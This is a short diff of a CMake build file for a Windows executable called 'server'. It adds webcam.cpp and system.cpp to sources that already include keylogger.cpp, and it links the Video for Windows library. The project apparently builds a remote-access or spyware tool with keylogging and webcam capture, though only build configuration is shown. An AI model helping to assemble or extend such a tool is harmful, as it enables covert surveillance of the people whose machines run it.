@@ -14,6 +14,8 @@ set(SOURCES
     src/keylogger.cpp
     src/processes.cpp
     src/router.cpp
+    src/webcam.cpp   
+    src/system.cpp
 )
 
 # ================== EXECUTABLE ==================
@@ -28,6 +30,7 @@ target_include_directories(server PRIVATE
 target_link_libraries(server
     ws2_32   # WinSock
     shell32  # ShellExecute
+    vfw32
 )
 
 # ================== WARNINGS ==================
